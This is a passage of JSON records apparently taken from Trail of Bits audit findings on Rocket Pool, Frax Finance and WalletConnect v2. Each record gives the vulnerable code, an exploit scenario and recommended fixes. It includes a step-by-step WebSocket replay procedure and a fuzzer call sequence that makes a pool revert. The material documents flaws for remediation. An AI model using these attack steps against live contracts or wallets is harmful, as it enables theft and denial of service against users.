Emscripten transpilation to solc-jscauses a security vulnerability in the Rocket Pool contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "4. Upgradeable contracts can block minipool withdrawals ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/RocketPool.pdf", "body": "At the beginning of this audit, the Rocket Pool team mentioned an important invariant: if a node operator is allowed to withdraw funds from a minipool, the withdrawal should always succeed. This invariant is meant to assure node operators that they will be able to withdraw their funds even if the systems governance upgrades network contracts to malicious versions. To withdraw funds from a minipool, a node operator calls the close or refund function, depending on the state of the minipool. The close function calls rocketMinipoolManager.destroyMinipool. The rocketMinipoolManager contract can be upgraded by governance, which could replace it with a version in which destroyMinipool reverts. This would cause withdrawals to revert, breaking the guarantee mentioned above. The refund function does not call any network contracts. However, the refund function cannot be used to retrieve all of the funds that close can retrieve. Governance could also tamper with the withdrawal process by altering node operators withdrawal addresses. (See TOB-ROCKET-001 for more details.) Exploit Scenario Alice, a node operator, owns a dissolved minipool and decides to withdraw her funds. However, before Alice calls close() on her minipool to withdraw her funds, governance upgrades the RocketMinipoolManager contract to a version in which calls to destroyMinipool fail. As a result, the close() functions call to RocketMinipoolManager.destroyMinipool fails, and Alice is unable to withdraw her funds. Recommendations Short term, use Soliditys try catch statement to ensure that withdrawal functions that should always succeed are not aected by function failures in other network contracts. Additionally, ensure that no important data validation occurs in functions whose failures are ignored. Long term, carefully examine the process through which node operators execute withdrawals and ensure that their withdrawals cannot be blocked by other network contracts.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "5. Lack of contract existence check on delegatecall will result in unexpected behavior ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/RocketPool.pdf", "body": "The RocketMinipool contract uses the delegatecall proxy pattern. If the implementation contract is incorrectly set or is self-destructed, the contract may not detect failed executions. The RocketMinipool contract implements a payable fallback function that is invoked when contract calls are executed. This function does not have a contract existence check: fallback(bytes calldata _input) external payable returns (bytes memory) { // If useLatestDelegate is set, use the latest delegate contract address delegateContract = useLatestDelegate ? getContractAddress(\"rocketMinipoolDelegate\") : rocketMinipoolDelegate; (bool success, bytes memory data) = delegateContract.delegatecall(_input); if (!success) { revert(getRevertMessage(data)); } return data; } Figure 5.1: RocketMinipool.sol#L102-L108 The constructor of the RocketMinipool contract also uses the delegatecall function without performing a contract existence check: constructor(RocketStorageInterface _rocketStorageAddress, address _nodeAddress, MinipoolDeposit _depositType) { [...] (bool success, bytes memory data) = getContractAddress(\"rocketMinipoolDelegate\").delegatecall(abi.encodeWithSignature('initialis e(address,uint8)', _nodeAddress, uint8(_depositType))); if (!success) { revert(getRevertMessage(data)); } } Figure 5.2: RocketMinipool.sol#L30-L43 A delegatecall to a destructed contract will return success as part of the EVM specication. The Solidity documentation includes the following warning: The low-level functions call, delegatecall and staticcall return true as their rst return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed. Figure 5.3: A snippet of the Solidity documentation detailing unexpected behavior related to delegatecall The contract will not throw an error if its implementation is incorrectly set or self-destructed. It will instead return success even though no code was executed. Exploit Scenario Eve upgrades the RocketMinipool contract to point to an incorrect new implementation. As a result, each delegatecall returns success without changing the state or executing code. Eve uses this failing to scam users. Recommendations Short term, implement a contract existence check before a delegatecall. Document the fact that suicide and selfdestruct can lead to unexpected behavior, and prevent future upgrades from introducing these functions. Long term, carefully review the Solidity documentation, especially the Warnings section, and the pitfalls of using the delegatecall proxy pattern. References  Contract Upgrade Anti-Patterns  Breaking Aave Upgradeability", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "6. tx.origin in RocketStorage authentication may be an attack vector ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/RocketPool.pdf", "body": "The RocketStorage contract contains all system storage values and the functions through which other contracts write to them. To prevent unauthorized calls, these functions are protected by the onlyLatestRocketNetworkContract modier. function setUint(bytes32 _key, uint _value) onlyLatestRocketNetworkContract override external { assembly { sstore (_key, _value) } } Figure 6.1: RocketStorage.sol#L205-209 The contract also contains a storageInit ag that is set to true when the system values have been initialized. function setDeployedStatus() external { // Only guardian can lock this down require(msg.sender == guardian, \"Is not guardian account\"); // Set it now storageInit = true; } Figure 6.2: RocketStorage.sol#L89-L94 The onlyLatestRocketNetworkContract modier has a switch and is disabled when the system is in the initialization phase. modifier onlyLatestRocketNetworkContract() { if (storageInit == true) { // Make sure the access is permitted to only contracts in our Dapp require(_getBool(keccak256(abi.encodePacked(\"contract.exists\", msg.sender))), \"Invalid or outdated network contract\"); } else { // Only Dapp and the guardian account are allowed access during initialisation. // tx.origin is only safe to use in this case for deployment since no external contracts are interacted with require(( tx.origin == guardian _getBool(keccak256(abi.encodePacked(\"contract.exists\", msg.sender))) || ), \"Invalid or outdated network contract attempting access during deployment\"); } _; } Figure 6.3: RocketStorage.sol#L36-L48 If the system is still in the initialization phase, any call that originates from the guardian account will be trusted. Exploit Scenario Eve creates a malicious airdrop contract, and Alice, the Rocket Pool systems guardian, calls it. The contract then calls RocketStorage and makes a critical storage update. After the updated value has been initialized, Alice sets storageInit to true, but the storage value set in the update persists, increasing the risk of a critical vulnerability. Recommendations Short term, clearly document the fact that during the initialization period, the guardian may not call any external contracts; nor may any system contract that the guardian calls make calls to untrusted parties. Long term, document all of the systems assumptions, both in the portions of code in which they are realized and in all places in which they aect stakeholders operations.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "7. Duplicated storage-slot computation can silently introduce errors ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/RocketPool.pdf", "body": "Many parts of the Rocket Pool codebase that access its eternal storage compute storage locations inline, which means that these computations are duplicated throughout the codebase. Many string constants appear in the codebase several times; these include minipool.exists (shown in gure 7.1), which appears four times. Duplication of the same piece of information in many parts of a codebase increases the risk of inconsistencies. Furthermore, because the code lacks existence and type checks for these strings, inconsistencies introduced into a contract by developer error may not be detected unless the contract starts behaving in unexpected ways. setBool(keccak256(abi.encodePacked(\"minipool.exists\", contractAddress)), true); Figure 7.1: RocketMinipoolManager.sol#L216 Many storage-slot computations take parameters. However, there are no checks on the types or number of the parameters that they take, and incorrect parameter values will not be caught by the Solidity compiler. Exploit Scenario Bob, a developer, adds a functionality that sets the network.prices.submitted.node.key string constant. He ABI-encodes the node address, block, and RPL price arguments but forgets to ABI-encode the eective RPL stake amount. The code then sets an entirely new storage slot that is not read anywhere else. As a result, the write operation is a no-op with undened consequences. Recommendations Short term, extract the computation of storage slots into helper functions (like that shown in 7.2). This will ensure that each string constant exists only in a single place, removing the potential for inconsistencies. These functions can also check the types of the parameters used in storage-slot computations. function contractExistsSlot(address contract) external pure returns (bytes32) { return keccak256(abi.encodePacked(\"contract.exists\", contract); } // _getBool(keccak256(abi.encodePacked(\"contract.exists\", msg.sender)) _getBool(contractExistsSlot(msg.sender)) // setBool(keccak256(abi.encodePacked(\"contract.exists\", _contractAddress)), true) setBool(contractExistsSlot(_contractAddress), true) Figure 7.2: An example of a helper function Long term, replace the raw setters and getters in RocketBase (e.g., setAddress) with setters and getters for specic values (e.g., the setContractExists setter) and restrict RocketStorage access to these setters.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Medium"]}, {"title": "8. Potential collisions between eternal storage and Solidity mapping storage slots ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/RocketPool.pdf", "body": "The Rocket Pool code uses eternal storage to store many named mappings. A named mapping is one that is identied by a string (such as minipool.exists) and maps a key (like contractAddress in gure 8.1) to a value. setBool(keccak256(abi.encodePacked(\"minipool.exists\", contractAddress)), true); Figure 8.1: RocketMinipoolManager.sol#L216 Given a mapping whose state variable appears at index N in the code, Solidity stores the value associated with key at a slot that is computed as follows: h = type(key) == string || type(key) == bytes ? keccak256 : left_pad_to_32_bytes slot = keccak256(abi.encodePacked(h(key), N)) Figure 8.2: Pseudocode of the Solidity computation of a mappings storage slot The rst item in a Rocket Pool mapping is the identier, which could enable an attacker to write values into a mapping that should be inaccessible to the attacker. We set the severity of this issue to informational because such an attack does not currently appear to be possible. Exploit Scenario Mapping A stores its state variable at slot n. Rocket Pool developers introduce new code, making it possible for an attacker to change the second argument to abi.encodePacked in the setBool setter (shown in gure 8.1). The attacker passes in a rst argument of 32 bytes and can then pass in n as the second argument and set an entry in Mapping A. Recommendations Short term, switch the order of arguments such that a mappings identier is the last argument and the key (or keys) is the rst (as in keccak256(key, unique_identifier_of_mapping)). Long term, carefully examine all raw storage operations and ensure that they cannot be used by attackers to access storage locations that should be inaccessible to them. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "1. Risk of unexpected results when long-term swaps involving rebasing tokens are canceled ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ22022.pdf", "body": "FraxSwaps use of rebasing tokenstokens whose supply can be adjusted to control their pricescould cause transactions to revert after users cancel or withdraw from long-term swaps. FraxSwap oers a new type of swap called a long-term swap, which executes certain swaps over an extended period of time. Users can cancel or withdraw from long-term swaps and recover all of their purchased and unsold tokens. ///@notice stop the execution of a long term order function cancelLongTermSwap(uint256 orderId) external lock execVirtualOrders { (address sellToken, uint256 unsoldAmount, address buyToken, uint256 purchasedAmount) = longTermOrders.cancelLongTermSwap(orderId); bool buyToken0 = buyToken == token0; twammReserve0 -= uint112(buyToken0 ? purchasedAmount : unsoldAmount); twammReserve1 -= uint112(buyToken0 ? unsoldAmount : purchasedAmount); // transfer to owner of order _safeTransfer(buyToken, msg.sender, purchasedAmount); _safeTransfer(sellToken, msg.sender, unsoldAmount); // update order. Used for tracking / informational longTermOrders.orderMap[orderId].isComplete = true; emit CancelLongTermOrder(msg.sender, orderId, sellToken, unsoldAmount, buyToken, purchasedAmount); } Figure 1.1: The cancelLongTermSwap function in the UniV2TWAMMPair contract However, if a rebasing token is used in a long-term swap, the balance of the UniV2TWAMMPair contract could increase or decrease over time. Such changes in the contracts balance could result in unintended eects when users try to cancel or withdraw from long-term swaps. For example, because all long-term swaps for a pair are processed as part of any function with the execVirtualOrders modier, if the actual balance of the UniV2TWAMMPair is reduced as part of one or more rebases in the underlying token, this balance will not be reected correctly in the contracts internal accounting, and cancel and withdraw operations will transfer too many tokens to users. Eventually, this will exhaust the contracts balance of the token before all users are able to withdraw, causing these transactions to revert. Exploit Scenario Alice creates a long-term swap; one of the tokens to be swapped is a rebasing token. After some time, the tokens supply is adjusted, causing the balance of UniV2TWAMMPair to decrease. Alice tries to cancel the long-term swap, but the internal bookkeeping for her swap was not updated to reect the rebase, causing the token transfer from the contract to Alice to revert and blocking her other token transfers from completing. To allow Alice to access funds and to allow subsequent transactions to succeed, some tokens need to be explicitly sent to the UniV2TWAMMPair contract to increase its balance. Recommendations Short term, explicitly document issues involving rebasing tokens and long-term swaps to ensure that users are aware of them. Long term, evaluate the security risks surrounding ERC20 tokens and how they could aect every system component. References  Common errors with rebasing tokens on Uniswap V2", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "2. Missing liquidity checks when initiating long-term swaps ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ22022.pdf", "body": "When a long-term swap is submitted to a UniV2TWAMMPair instance, the code performs checks, such as those ensuring that the selling rate of a given token is nonzero, before the order is recorded. However, the code does not validate the existing reserves for the tokens being bought in long-term swaps. ///@notice adds long term swap to order pool function performLongTermSwap(LongTermOrders storage longTermOrders, address from, address to, uint256 amount, uint256 numberOfTimeIntervals) private returns (uint256) { // make sure to update virtual order state (before calling this function) //determine the selling rate based on number of blocks to expiry and total amount uint256 currentTime = block.timestamp; uint256 lastExpiryTimestamp = currentTime - (currentTime % longTermOrders.orderTimeInterval); uint256 orderExpiry = longTermOrders.orderTimeInterval * (numberOfTimeIntervals + 1) + lastExpiryTimestamp; uint256 sellingRate = SELL_RATE_ADDITIONAL_PRECISION * amount / (orderExpiry - currentTime); require(sellingRate > 0); // tokenRate cannot be zero Figure 2.1: Uniswap_V2_TWAMM/twamm/LongTermOrders.sol#L118-L128 If a long-term swap is submitted before adequate liquidity has been added to the pool, the next pool operation will attempt to trade against inadequate liquidity, resulting in a division-by-zero error in the line highlighted in blue in gure 2.2. As a result, all pool operations will revert until the number of tokens needed to begin executing the virtual swap are added. ///@notice computes the result of virtual trades by the token pools function computeVirtualBalances( uint256 token0Start, uint256 token1Start, uint256 token0In, uint256 token1In) internal pure returns (uint256 token0Out, uint256 token1Out, uint256 ammEndToken0, uint256 ammEndToken1) { token0Out = 0; token1Out = 0; //when both pools sell, we use the TWAMM formula else { uint256 aIn = token0In * 997 / 1000; uint256 bIn = token1In * 997 / 1000; uint256 k = token0Start * token1Start; ammEndToken1 = token0Start * (token1Start + bIn) / (token0Start + aIn); ammEndToken0 = k / ammEndToken1; token0Out = token0Start + aIn - ammEndToken0; token1Out = token1Start + bIn - ammEndToken1; } Figure 2.2: Uniswap_V2_TWAMM/twamm/ExecVirtualOrders.sol#L39-L78 The long-term swap functionality can be paused by the contract owner (e.g., to prevent long-term swaps when a pool has inadequate liquidity); however, by default, the functionality is enabled when a new pool is deployed. An attacker could exploit this fact to grief a newly deployed pool by submitting long-term swaps early in its lifecycle when it has minimal liquidity. Additionally, even if a newly deployed pool is already loaded with adequate liquidity, a user could submit long-term swaps with zero intervals to trigger an integer underow in the line highlighted in red in gure 2.2. However, note that the user would have to submit at least one long-term swap that requires more than the total liquidity in the reserve: testSync(): failed! Call sequence:     initialize(6809753114178753104760,5497681857357274469621,837982930770660231771 7,10991961728915299510446) longTermSwapFrom1To0(2,0) testLongTermSwapFrom0To1(23416246225666705882600004967801889944504351201487667 6541160061227714669,0) testSync() Time delay: 37073 seconds Block delay: 48 Figure 2.3: The Echidna output that triggers a revert in a call to sync() Exploit Scenario A new FraxSwap pool is deployed, causing the long-term swap functionality to be unpaused. Before users have a chance to add sucient liquidity to the pool, Eve initiates long-term swaps in both directions. Since there are no tokens available to purchase, all pool operations revert, and the provided tokens are trapped. At this point, adding more liquidity is not possible since doing so also triggers the long-term swap computation, forcing a revert. Recommendations Short term, disable new swaps and remove all the liquidity in the deployed contracts. Modify the code so that, moving forward, liquidity can be added without executing long-term swaps. Document the pool state requirements before long-term swaps can be enabled. Long term, use extensive smart contract fuzzing to test that important operations cannot be blocked.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "3. Missing events in several contracts ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ22022.pdf", "body": "An insucient number of events is declared in the Frax Finance contracts. As a result, malfunctioning contracts or malicious attacks may not be noticed. For instance, long-term swaps are executed in batches by the executeVirtualOrdersUntilTimestamp function: ///@notice executes all virtual orders until blockTimestamp is reached. function executeVirtualOrdersUntilTimestamp(LongTermOrders storage longTermOrders, uint256 blockTimestamp, ExecuteVirtualOrdersResult memory reserveResult) internal { uint256 nextExpiryBlockTimestamp = longTermOrders.lastVirtualOrderTimestamp - (longTermOrders.lastVirtualOrderTimestamp % longTermOrders.orderTimeInterval) + longTermOrders.orderTimeInterval; //iterate through time intervals eligible for order expiries, moving state forward OrderPool storage orderPool0 = longTermOrders.OrderPool0; OrderPool storage orderPool1 = longTermOrders.OrderPool1; while (nextExpiryBlockTimestamp < blockTimestamp) { // Optimization for skipping blocks with no expiry if (orderPool0.salesRateEndingPerTimeInterval[nextExpiryBlockTimestamp] > 0 || orderPool1.salesRateEndingPerTimeInterval[nextExpiryBlockTimestamp] > 0) { //amount sold from virtual trades uint256 blockTimestampElapsed = nextExpiryBlockTimestamp - longTermOrders.lastVirtualOrderTimestamp; uint256 token0SellAmount = orderPool0.currentSalesRate * blockTimestampElapsed / SELL_RATE_ADDITIONAL_PRECISION; uint256 token1SellAmount = orderPool1.currentSalesRate * blockTimestampElapsed / SELL_RATE_ADDITIONAL_PRECISION; (uint256 token0Out, uint256 token1Out) = executeVirtualTradesAndOrderExpiries(reserveResult, token0SellAmount, token1SellAmount); orderPool1, token0Out, token1Out, nextExpiryBlockTimestamp); updateOrderPoolAfterExecution(longTermOrders, orderPool0, } nextExpiryBlockTimestamp += longTermOrders.orderTimeInterval; } //finally, move state to current blockTimestamp if necessary if (longTermOrders.lastVirtualOrderTimestamp != blockTimestamp) { //amount sold from virtual trades uint256 blockTimestampElapsed = blockTimestamp - longTermOrders.lastVirtualOrderTimestamp; uint256 token0SellAmount = orderPool0.currentSalesRate * blockTimestampElapsed / SELL_RATE_ADDITIONAL_PRECISION; uint256 token1SellAmount = orderPool1.currentSalesRate * blockTimestampElapsed / SELL_RATE_ADDITIONAL_PRECISION; (uint256 token0Out, uint256 token1Out) = executeVirtualTradesAndOrderExpiries(reserveResult, token0SellAmount, token1SellAmount); updateOrderPoolAfterExecution(longTermOrders, orderPool0, orderPool1, token0Out, token1Out, blockTimestamp); } } Figure 3.1: Uniswap_V2_TWAMM/twamm/LongTermOrders.sol#L216-L252 However, despite the complexity of this function, it does not emit any events; it will be dicult to monitor issues that may arise whenever the function is executed. Additionally, important operations in the FPIControllerPool and CPITrackerOracle contracts do not emit any events: function toggleMints() external onlyByOwnGov { mints_paused = !mints_paused; } function toggleRedeems() external onlyByOwnGov { redeems_paused = !redeems_paused; } function setFraxBorrowCap(int256 _frax_borrow_cap) external onlyByOwnGov { frax_borrow_cap = _frax_borrow_cap; } function setMintCap(uint256 _fpi_mint_cap) external onlyByOwnGov { fpi_mint_cap = _fpi_mint_cap; } Figure 3.2: FPI/FPIControllerPool.sol#L528-L542 Events generated during contract execution aid in monitoring, baselining of behavior, and detection of suspicious activity. Without events, users and blockchain-monitoring systems cannot easily detect behavior that falls outside the baseline conditions, and it will be dicult to review the correct behavior of the contracts once they have been deployed. Exploit Scenario Eve, a malicious user, discovers a vulnerability that allows her to manipulate long-term swaps. Because no events are generated from her actions, the attack goes unnoticed. Eve uses her exploit to drain liquidity or prevent other users from swapping before the Frax Finance team has a chance to respond. Recommendations Short term, emit events for all operations that may contribute to a higher level of monitoring and alerting, even internal ones. Long term, consider using a blockchain-monitoring system to track any suspicious behavior in the contracts. A monitoring mechanism for critical events could quickly detect system compromises.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "4. Unsafe integer conversions in FPIControllerPool ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ22022.pdf", "body": "Explicit integer conversions can be used to bypass certain restrictions (e.g., the borrowing cap) in the FPIControllerPool contract. The FPIControllerPool contract allows certain users to either borrow or repay FRAX within certain limits (e.g., the borrowing cap): // Lend the FRAX collateral to an AMO function giveFRAXToAMO(address destination_amo, uint256 frax_amount) external onlyByOwnGov validAMO(destination_amo) { int256 frax_amount_i256 = int256(frax_amount); // Update the balances first require((frax_borrowed_sum + frax_amount_i256) <= frax_borrow_cap, \"Borrow frax_borrowed_balances[destination_amo] += frax_amount_i256; frax_borrowed_sum += frax_amount_i256; // Give the FRAX to the AMO TransferHelper.safeTransfer(address(FRAX), destination_amo, frax_amount); cap\"); } // AMO gives back FRAX. Needed for proper accounting function receiveFRAXFromAMO(uint256 frax_amount) external validAMO(msg.sender) { int256 frax_amt_i256 = int256(frax_amount); // Give back first TransferHelper.safeTransferFrom(address(FRAX), msg.sender, address(this), frax_amount); // Then update the balances frax_borrowed_balances[msg.sender] -= frax_amt_i256; frax_borrowed_sum -= frax_amt_i256; } Figure 4.1: The giveFRAXToAMO function in FPIControllerPool.sol However, these functions explicitly convert these variables from uint256 to int256; these conversions will never revert and can produce unexpected results. For instance, if frax_amount is set to a very large unsigned integer, it could be cast to a negative number. Malicious users could exploit this fact by adjusting the variables to integers that will bypass the limits imposed by the code after they are cast. The same issue aects the implementation of price_info: // Get additional info about the peg status function price_info() public view returns ( int256 collat_imbalance, uint256 cpi_peg_price, uint256 fpi_price, uint256 price_diff_frac_abs ) { fpi_price = getFPIPriceE18(); cpi_peg_price = cpiTracker.currPegPrice(); uint256 fpi_supply = FPI_TKN.totalSupply(); if (fpi_price > cpi_peg_price){ collat_imbalance = int256(((fpi_price - cpi_peg_price) * fpi_supply) / PRICE_PRECISION); price_diff_frac_abs = ((fpi_price - cpi_peg_price) * PEG_BAND_PRECISION) / fpi_price; } else { collat_imbalance = -1 * int256(((cpi_peg_price - fpi_price) * fpi_supply) / PRICE_PRECISION); price_diff_frac_abs = ((cpi_peg_price - fpi_price) * PEG_BAND_PRECISION) / fpi_price; } } Figure 4.2: The price_info function in FPIControllerPool.sol Exploit Scenario Eve submits a governance proposal that can increase the amount of FRAX that can be borrowed. The voters approve the proposal because they believe that the borrowing cap will stop Eve from changing it to a larger value. Recommendations Short term, add checks to the relevant functions to validate the results of explicit integer conversions to ensure that they are within the expected range. Long term, use extensive smart contract fuzzing to test that system invariants cannot be broken.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "5. leveragedPosition and repayAssetWithCollateral do not update the exchangeRate ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ22022.pdf", "body": "Some FraxLend functions do not update the exchange rate, allowing insolvent users to call them. The FraxLend platform oers various operations, such as leveragedPosition and repayAssetWithCollateral, for users to borrow funds as long as they are solvent. The solvency check is implemented by the isSolvent modier, which runs at the end of such operations: /// @notice Checks for solvency AFTER executing contract code /// @param _borrower The borrower whose solvency we will check modifier isSolvent(address _borrower) { _; require(_isSolvent(_borrower, exchangeRateInfo.exchangeRate), \"FraxLendPair: user is insolvent\"); } Figure 5.1: The isSolvent modier in the FraxLendCore contract However, this modier is not enough to ensure solvency since the exchange rate changes over time, which can make previously solvent users insolvent. That is why it is important to force an update of the exchange rate during any operation that allows users to borrow funds: function updateExchangeRate() public returns (uint256 _exchangeRate) { ExchangeRateInfo memory _exchangeRateInfo = exchangeRateInfo; if (_exchangeRateInfo.lastTimestamp == block.timestamp) return _exchangeRate = _exchangeRateInfo.exchangeRate;  // write to storage _exchangeRateInfo.exchangeRate = uint224(_exchangeRate); _exchangeRateInfo.lastTimestamp = uint32(block.timestamp); exchangeRateInfo = _exchangeRateInfo; emit UpdateExchangeRate(_exchangeRate); } Figure 5.2: Part of the updateExchangeRate function in the FraxLendCore contract However, the leveragedPosition and repayAssetWithCollateral operations increase the debt of the caller but do not call updateExchangeRate; therefore, they will perform the solvency check with old information. Exploit Scenario Eve, a malicious user, notices a drop in the collateral price. She calls leveragedPosition or repayAssetWithCollateral to borrow more than the amount of shares/collateral she should be able to. Recommendations Short term, add a call to updateExchangeRate in every function that increases users debt. Long term, document the invariants and preconditions for every function and use extensive smart contract fuzzing to test that system invariants cannot be broken.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "6. Risk of hash collisions in FraxLendPairDeployer that could block certain deployments ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ22022.pdf", "body": "A hash collision could occur in the FraxLendPairDeployer contract, allowing unauthenticated users to block the deployment of certain contracts from authenticated users. The FraxLendPairDeployer contract allows any user to deploy certain contracts using the deploy function, which creates a contract name based on certain parameters: function deploy( address _asset, address _collateral, address _oracleTop, address _oracleDiv, uint256 _oracleNormalization, address _rateContract, bytes calldata _rateInitCallData ) external returns (address _pairAddress) { string memory _name = string( abi.encodePacked( \"FraxLendV1-\", IERC20(_collateral).safeName(), \"/\", IERC20(_asset).safeName(), \" - \", IRateCalculator(_rateContract).name(), \" - \", deployedPairsArray.length + 1 ) );  Figure 6.1: The header of the deploy function in the FraxLendPairDeployer contract The _deploySecond function creates a hash of this contract name and checks it to ensure that it has not already been deployed: function _deploySecond( string memory _name, address _pairAddress, address _asset, address _collateral, uint256 _maxLTV, uint256 _liquidationFee, address _oracleTop, address _oracleDiv, uint256 _oracleNormalization, address _rateContract, bytes memory _rateInitCallData, address[] memory _approvedBorrowers, address[] memory _approvedLenders ) private {  bytes32 _nameHash = keccak256(bytes(_name)); require(deployedPairsByName[_nameHash] == address(0), \"FraxLendPairDeployer: Pair name must be unique\"); deployedPairsByName[_nameHash] = _pairAddress;  Figure 6.2: Part of the _deploySecond function in the FraxLendPairDeployer contract Both authenticated and unauthenticated users can use this code to deploy contracts, but only authenticated users can select any name for contracts they want to deploy. Additionally, the _deployFirst function computes a salt based on certain parameters: function _deployFirst( address _asset, address _collateral, uint256 _maxLTV, uint256 _liquidationFee, address _oracleTop, address _oracleDiv, uint256 _oracleNormalization, address _rateContract, bytes memory _rateInitCallData, bool _isBorrowerWhitelistActive, bool _isLenderWhitelistActive ) private returns (address _pairAddress) { { //clones are distinguished by their data bytes32 salt = keccak256( abi.encodePacked( _asset, _collateral, _maxLTV, _liquidationFee, _oracleTop, _oracleDiv, _oracleNormalization, _rateContract, _rateInitCallData, _isBorrowerWhitelistActive, _isLenderWhitelistActive ) ); require(deployedPairsBySalt[salt] == address(0), \"FraxLendPairDeployer: Pair already deployed\");  Figure 6.3: The header of the _deployFirst function in the FraxLendPairDeployer contract Again, both authenticated and unauthenticated users can use this code, but some parameters are xed for unauthorized users (e.g., _maxLTV will always be DEFAULT_MAX_LTV and cannot be changed). However, in both cases, a hash collision could block contracts from being deployed. For example, if an unauthenticated user sees an authenticated users pending transaction to deploy a contract, he could deploy his own contract with a name or parameters that result in a hash collision, preventing the authenticated users contract from being deployed. Exploit Scenario Alice, an authenticated user, starts a custom deployment with certain parameters. Eve, a malicious user, sees Alices unconrmed transactions and front-runs them with her own call to deploy a contract with similar parameters. Eves transaction succeeds, causing Alices deployment to fail and forcing her to change either the contracts name or the parameters of the call to deploy. Recommendations Short term, prevent collisions between dierent types of deployments. Long term, review the permissions and capabilities of authenticated and unauthenticated users in every component.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "1. Use of outdated dependencies ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-walletconnectv2-securityreview.pdf", "body": "We used npm audit and lerna-audit to detect the use of outdated dependencies in the codebase. These tools discovered a number of vulnerable packages that are referenced by the package-lock.json les. The following tables describe the vulnerable dependencies used in the walletconnect-utils and walletconnect-monorepo repositories : walletconnect-utils Dependencies Vulnerability Report Vulnerability", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "2. No protocol-level replay protections in WalletConnect ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-walletconnectv2-securityreview.pdf", "body": "Applications and wallets using WalletConnect v2 can exchange messages using the WalletConnect protocol through a public WebSocket relay server. Exchanged data is encrypted and authenticated with keys unknown to the relay server. However, using dynamic testing during the audit, we observed that the protocol does not protect against replay attacks. The WalletConnect authentication protocol is essentially a challenge-response protocol between users and servers, where users produce signatures using the private keys from their wallets. A signature is performed over a message containing, among many other components, a nonce value chosen by the server. This nonce value is intended presumably to prevent an adversary from replaying an old signature that a user generated to authenticate themselves. However, there does not seem to be any validation against this nonce value (except validation that it exists), so the library would accept replayed signatures. In addition to missing validation of the nonce value, the payload for the signature does not appear to include the pairing topic for the pairing established between a user and the server. Because the authentication protocol runs only over an existing pairing, it would make sense to include the pairing topic value inside the signature payload. Doing so would prevent a malicious user from replaying another users previously generated signature for a new pairing that they establish with the server. To repeat our experiment that uncovered this issue, pair the React App demo application with the React Wallet demo application and intercept the trac generated from the React App demo application (e.g., use a local proxy such as BurpSuite). Initiate a transaction from the application, capture the data sent through the WebSocket channel, and conrm the transaction in the wallet. A sample captured message is shown in gure 2.1. Now, edit the message eld slightly and add == to the end of the string (= is the Base64 padding character). Finally, replay (resend) the captured data. A new conrmation dialog box should appear in the wallet. { \"id\" : 1680643717702847 , \"jsonrpc\" : \"2.0\" , \"method\" : \"irn_publish\" , \"params\" : { \"topic\" : \"42507dee006fe8(...)2d797cccf8c71fa9de4\" , \"message\" : \"AFv70BclFEn6MteTRFemaxD7Q7(...)y/eAPv3ETRHL0x86cJ6iflkIww\" , \"ttl\" : 300 , \"prompt\" : true , \"tag\" : 1108 } } Figure 2.1: A sample message sent from the dApp This nding is of undetermined severity because it is not obvious whether and how an attacker could use this vulnerability to impact users. When this nding was originally presented to the WalletConnect team, the recommended remediation was to track and enforce the correct nonce values. However, due to the distributed nature of the WalletConnect system, this could prove dicult in practice. In response, we have updated our recommendation to use timestamps instead. Timestamps are not as eective as nonces are for preventing replay attacks because it is not always possible to have a secure clock that can be relied upon. However, if nonces are infeasible to implement, timestamps are the next best option. Recommendations Short term, update the implementation of the authentication protocol to include timestamps in the signature payload that are then checked against the current time (within a reasonable window of time) upon signature validation. In addition to this, include the pairing topic in the signature payload. Long term, consider including all relevant pairing and authentication data in the signature payload, such as sender and receiver public keys. If possible, consider using nonces instead of timestamps to more eectively prevent replay attacks.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "3. Key derivation code could produce keys composed of all zeroes ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-walletconnectv2-securityreview.pdf", "body": "The current implementation of the code that derives keys using the x25519 library does not enable the rejectZero option. If the counterparty is compromised, this may result in a derived key composed of all zeros, which could allow an attacker to observe or tamper with the communication. export function deriveSymKey(privateKeyA: string , publicKeyB: string ): string { const sharedKey = x25519.sharedKey( fromString(privateKeyA, BASE16), fromString(publicKeyB, BASE16), ); const hkdf = new HKDF(SHA256, sharedKey); const symKey = hkdf.expand(KEY_LENGTH); return toString(symKey, BASE16); } Figure 3.1: The code that derives keys using x25519.sharedKey ( walletconnect-monorepo/packages/utils/src/crypto.ts#3543 ) The x25519 library includes a warning about this case: /** * Returns a shared key between our secret key and a peer's public key. * * Throws an error if the given keys are of wrong length. * * If rejectZero is true throws if the calculated shared key is all-zero . * From RFC 